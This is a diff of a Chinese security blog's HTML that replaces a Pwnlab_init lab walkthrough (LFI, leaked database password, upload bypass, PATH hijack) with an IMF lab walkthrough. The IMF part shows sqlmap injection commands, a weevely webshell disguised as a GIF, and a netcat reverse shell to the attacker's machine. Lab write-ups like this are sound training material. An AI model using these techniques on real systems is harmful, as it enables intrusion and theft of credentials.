@@ -6,7 +6,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    Pwnlab_init |  岛
+    IMF |  岛
   </title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   
@@ -32,7 +32,7 @@
   <div id="app">
     <main class="content">
       <section class="outer">
-  <article id="post-Pwnlab-init" class="article article-type-post" itemscope
+  <article id="post-IMF" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -40,7 +40,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  Pwnlab_init
+  IMF
 </h1>
   
 
@@ -49,8 +49,8 @@
 
     
     <div class="article-meta">
-      <a href="/2020/03/12/Pwnlab-init/" class="article-date">
-  <time datetime="2020-03-12T14:22:07.000Z" itemprop="datePublished">2020-03-12</time>
+      <a href="/2020/03/14/IMF/" class="article-date">
+  <time datetime="2020-03-14T10:50:11.000Z" itemprop="datePublished">2020-03-14</time>
 </a>
       
   <div class="article-category">
@@ -64,7 +64,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">607字</span>
+            <span class="post-count">427字</span>
         </span>
     </span>
 
@@ -73,7 +73,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">2分钟</span>
+            <span class="post-count">1分钟</span>
         </span>
     </span>
 </div>
@@ -100,123 +100,44 @@
       
 
       
-      <h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/12/Pwnlab-init/image-20200312222253552.png" alt="image-20200312222253552"></p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312222520688.png" alt="image-20200312222520688"></p>
-<p>发现80端口的url是这样的</p>
-<p> <a href="http://192.168.0.104/?page=login" target="_blank" rel="noopener">http://192.168.0.104/?page=login</a><br> <a href="http://192.168.0.104/?page=upload" target="_blank" rel="noopener">http://192.168.0.104/?page=upload</a></p>
-<ol>
-<li>可能存在 LFI 漏洞</li>
-<li>构造URL <a href="http://192.168.0.104/?page=php://filter/convert.base64-encode/resource=login" target="_blank" rel="noopener">http://192.168.0.104/?page=php://filter/convert.base64-encode/resource=login</a></li>
-<li>发现可以包含读到文件，然后base64解密</li>
-</ol>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312223045306.png" alt="image-20200312223045306"></p>
-<p>代码如下</p>
-<p>—login.php—</p>
-<p><code>&lt;?php
-session_start();require(&quot;config.php&quot;);server, password, $database);if (isset(POST[&#39;pass&#39;]))
-{
-    POST[&#39;user&#39;];
-    _POST[&#39;pass&#39;]);$stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM users WHERE user=? AND pass=?&quot;);
-$stmt-&gt;bind_param(&#39;ss&#39;, $luser, $lpass);
-$stmt-&gt;execute();
-$stmt-&gt;store_Result();
-if ($stmt-&gt;num_rows == 1)
-{
-    $_SESSION[&#39;user&#39;] = $luser;
-    header(&#39;Location: ?page=upload&#39;);
-}
-else
-{
-    echo &quot;Login failed.&quot;;
-}    &lt;?php
-}Username: 
-Password: 
-}
-else
-{
-    ?&gt;</code></p>
-<p>跟着再把<code>require</code>中的config读出来</p>
-<p><code>&lt;?php
-$server   = &quot;localhost&quot;;
-$username = &quot;root&quot;;
-$password = &quot;H4u%QJ_H99&quot;;
-$database = &quot;Users&quot;;
-?&gt;%</code></p>
-<p>顺便也把index和upload的也读了</p>
-<p>—index—</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312234059880.png" alt="image-20200312234059880"></p>
-<p>—upload—</p>
-<?php
-session_start();
-if (!isset($_SESSION['user'])) { die('You must be log in.'); }
-?>
-
-<?php 
-if(isset($_POST['submit'])) {
-    if ($_FILES['file']['error'] <= 0) {
-        $filename  = $_FILES['file']['name'];
-        $filetype  = $_FILES['file']['type'];
-        $uploaddir = 'upload/';
-        $file_ext  = strrchr($filename, '.');
-        $imageinfo = getimagesize($_FILES['file']['tmp_name']);
-        $whitelist = array(".jpg",".jpeg",".gif",".png"); 
-
-
-    if (!(in_array($file_ext, $whitelist))) {
-        die('Not allowed extension, please upload images only.');
-    }
-
-    if(strpos($filetype,'image') === false) {
-        die('Error 001');
-    }
-
-    if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
-        die('Error 002');
-    }
-
-    if(substr_count($filetype, '/')>1){
-        die('Error 003');
-    }
-
-    $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;
-
-    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
-        echo "<img src="/2020/03/12/Pwnlab-init/"".$uploadfile."\""><br>";
-    } else {
-        die('Error 4');
-    }
-}
-}
-
-?><p>%</p>
-<p>在上面已经拿到了MySQL的账号密码了，而且在用nmap扫的时候已经发现3306端口是开放的。</p>
-<p>mysql -h 192.168.0.104 -u root -D Users -p密码是config文件的那个</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312224817346.png" alt="image-20200312224817346"></p>
-<p>拿到用户名</p>
-<h1 id="0x01-Bypass"><a href="#0x01-Bypass" class="headerlink" title="0x01 Bypass"></a><strong>0x01 Bypass</strong></h1><p>登录上传文件试试，上面的源码已经知道只能上传图片后缀的文件，而且还判了文件类型和mime</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312225323119.png" alt="image-20200312225323119"></p>
-<p>加个图片标志绕过</p>
-<p>burp上传回来个相对路径 upload/51c65dd716e81189745d6eb1c9f1bb6b.gif</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312230453184.png" alt="image-20200312230453184"></p>
-<p>让他弹回来 用cookie传入路径</p>
-<p>curl –cookie “lang=../upload/51c65dd716e81189745d6eb1c9f1bb6b.gif” “<a href="http://192.168.0.104&quot;" target="_blank" rel="noopener">http://192.168.0.104&quot;</a></p>
-<p>拿到了</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312231440117.png" alt="image-20200312231440117"></p>
-<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’ 获取一个tty</p>
-<p>用之前数据库里拿到的三个账号尝试登陆</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312231648685.png" alt="image-20200312231648685"></p>
-<h1 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a><strong>0x02 提权</strong></h1><p>思路是这样的</p>
-<p>1.从截图可以看到，这是一个ELF 32位 LSB执行文件，但是当我们执行文件的时候，报错了</p>
-<p>2.通过报错信息我们可以看到msgmike调用cat命令读取/home/mike/msg.txt文件</p>
-<p>针对这种情况，我们可以通过设置bash的$path环境变量来利用</p>
-<p>3.然而当我们调用cat命令的时候，cat会从以上目录来寻找，如果我们添加.到$PATH环境变量，</p>
-<p>4.则会先从当前目录来寻找cat指令，相当于我们自己创建一个读文件的cat指令，用这个指令来</p>
-<p>5.读新建取/home/mike/msg.txt文件，我们新建一个cat文件，并添加执行权限</p>
-<p>6.这样当我们再次运行./msgmike命令的时候，就会触发当前目录下的cat(/bin/sh)，</p>
-<p>我们就会提升到mike权限</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312232750822.png" alt="image-20200312232750822"></p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312232900069.png" alt="image-20200312232900069"></p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312232907099.png" alt="image-20200312232907099"></p>
+      <h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/14/IMF/image-20200314185633352.png" alt="image-20200314185633352"></p>
+<p>就一个80</p>
+<h1 id="0x01-flag1"><a href="#0x01-flag1" class="headerlink" title="0x01 flag1"></a><strong>0x01 flag1</strong></h1><p>看源码就行了</p>
+<p><img src="/2020/03/14/IMF/image-20200314185815358.png" alt="image-20200314185815358"></p>
+<p>base64解这个flag 提示我们allthefiles<img src="/2020/03/14/IMF/image-20200314185917680.png" alt="image-20200314185917680"></p>
+<h1 id="0x02-flag2"><a href="#0x02-flag2" class="headerlink" title="0x02 flag2"></a><strong>0x02 flag2</strong></h1><p>我们再细看 这几行js有点怪 拼起来得到flag2 提示imfadministrator</p>
+<p><img src="/2020/03/14/IMF/image-20200314190308552.png" alt="image-20200314190308552"></p>
+<p><img src="/2020/03/14/IMF/image-20200314190426313.png" alt="image-20200314190426313"></p>
+<p><img src="/2020/03/14/IMF/image-20200314190511844.png" alt="image-20200314190511844"></p>
+<h1 id="0x03-flag3"><a href="#0x03-flag3" class="headerlink" title="0x03 flag3"></a><strong>0x03 flag3</strong></h1><p>根据给的路径发现登陆页面<br>根据回显发现rmichaels用户名存在<br>查看源码发现密码使用硬编码<br>如果是硬编码的，我们猜测他使用了strcmp函数，strcmp()是对于相等的字符串返回0，不同的字符串返回非0，但如果比较非字符串，strcmp()将返回null。在php中null==0是true。使得数组看起来与硬编码的密码字符串匹配。<br>所以我们此处传一个数组，将pass字段重命名为pass[]。<br>用户名使用rmichaels，将pass字段重命名为pass[]。</p>
+<p><img src="/2020/03/14/IMF/image-20200314220716954.png" alt="image-20200314220716954"></p>
+<p><img src="/2020/03/14/IMF/image-20200314220834567.png" alt="image-20200314220834567"></p>
+<p><img src="/2020/03/14/IMF/image-20200314220905157.png" alt="image-20200314220905157"></p>
+<h1 id="0x04-flag4"><a href="#0x04-flag4" class="headerlink" title="0x04 flag4"></a><strong>0x04 flag4</strong></h1><p>进到IMF里pagename参数有个upload有注入 sqlmap走起</p>
+<p><img src="/2020/03/14/IMF/image-20200314221515461.png" alt="image-20200314221515461"></p>
+<p>sqlmap -u “<a href="http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;" target="_blank" rel="noopener">http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;</a> –cookie “PHPSESSID=dfij6638dhhltl0vplg5q71um3” –dbs</p>
+<p><img src="/2020/03/14/IMF/image-20200314222022401.png" alt="image-20200314222022401"></p>
+<p>跑admin<br>sqlmap -u “<a href="http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;" target="_blank" rel="noopener">http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;</a> –cookie “PHPSESSID=dfij6638dhhltl0vplg5q71um3” -D admin –tables<br><img src="/2020/03/14/IMF/image-20200314222132550.png" alt="image-20200314222132550"></p>
+<p>新页面<br><img src="/2020/03/14/IMF/image-20200314222241091.png" alt="image-20200314222241091"></p>
+<p><img src="/2020/03/14/IMF/image-20200314222527908.png" alt="image-20200314222527908"></p>
+<p>扫扫更健康</p>
+<p><img src="/2020/03/14/IMF/image-20200314222607823.png" alt="image-20200314222607823"></p>
+<p>解码<br><img src="/2020/03/14/IMF/image-20200314222659426.png" alt="image-20200314222659426"></p>
+<h1 id="0x05-flag5"><a href="#0x05-flag5" class="headerlink" title="0x05 flag5"></a><strong>0x05 flag5</strong></h1><p>访问下解码后的php</p>
+<p><img src="/2020/03/14/IMF/image-20200314222754725.png" alt="image-20200314222754725"></p>
+<p>亲自试水 常规上传别试了 上weevely吧<br>weevely generate t00r ~/shell.php<br><img src="/2020/03/14/IMF/image-20200314223138650.png" alt="image-20200314223138650"><br>改个文件头 文件后缀也变gif<br><img src="/2020/03/14/IMF/image-20200314223316403.png" alt="image-20200314223316403"><br>上传成功</p>
+<p><img src="/2020/03/14/IMF/image-20200314224722194.png" alt="image-20200314224722194"></p>
+<p>源码里这个就是文件落地后的名字<br><img src="/2020/03/14/IMF/image-20200314225025848.png" alt="image-20200314225025848"></p>
+<p>连接后查看flag5 解码<br><img src="/2020/03/14/IMF/image-20200314225510979.png" alt="image-20200314225510979"><br>提示agentservices</p>
+<h1 id="0x06-flag6"><a href="#0x06-flag6" class="headerlink" title="0x06 flag6"></a><strong>0x06 flag6</strong></h1><p>nc去弄个交互式shell<br>攻击机：nc -lvp 2333<br>靶机：:backdoor_reversetcp 192.168.0.106 2333<br><img src="/2020/03/14/IMF/image-20200314230121345.png" alt="image-20200314230121345"></p>
+<p>ps -aux看看进程 发现有knock进程怪不得开始信息收集时候只有80端口<br><img src="/2020/03/14/IMF/image-20200314230358950.png" alt="image-20200314230358950"><br>再看看网络 netstat -antp 发现个7788</p>
+<p><img src="/2020/03/14/IMF/image-20200314230649667.png" alt="image-20200314230649667"></p>
+<p>进一步了解下 之前的flag5提示我们也是代理</p>
+<p><img src="/2020/03/14/IMF/image-20200314230734515.png" alt="image-20200314230734515"></p>
+<p>find全局查agent文件 打开两个</p>
+<p><img src="/2020/03/14/IMF/image-20200314231323432.png" alt="image-20200314231323432"></p>
+<p>根据敲门密码 敲端口</p>
+<p><img src="/2020/03/14/IMF/image-20200314232557766.png" alt="image-20200314232557766"></p>
 
       
       <!-- reward -->
@@ -286,7 +207,7 @@ if(isset($_POST['submit'])) {
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/03/12/Pwnlab-init/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/03/14/IMF/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -304,19 +225,10 @@ if(isset($_POST['submit'])) {
   
   <nav class="article-nav">
     
-      <a href="/2020/03/14/IMF/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            IMF
-          
-        </div>
-      </a>
     
-    
-      <a href="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/" class="article-nav-link">
+      <a href="/2020/03/12/Pwnlab-init/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">Kioptrix全集</div>
+        <div class="article-nav-title">Pwnlab_init</div>
       </a>
     
   </nav>
